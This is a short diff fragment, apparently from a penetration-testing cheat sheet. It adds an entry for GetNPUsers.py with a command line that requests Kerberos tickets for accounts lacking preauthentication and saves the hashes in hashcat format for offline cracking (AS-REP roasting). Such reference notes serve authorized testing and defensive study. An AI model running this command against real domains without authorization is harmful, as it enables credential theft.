@@ -72,6 +72,12 @@ python GetUserSPNs.py domain/user:password
 
 
 
+### GetNpUsers.py: "Do not require Kerberos preauthentication" set and ask for their TGTs without knowing their passwords.
+
+```
+GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+```
+
 ###
 
 ## Windows Swag
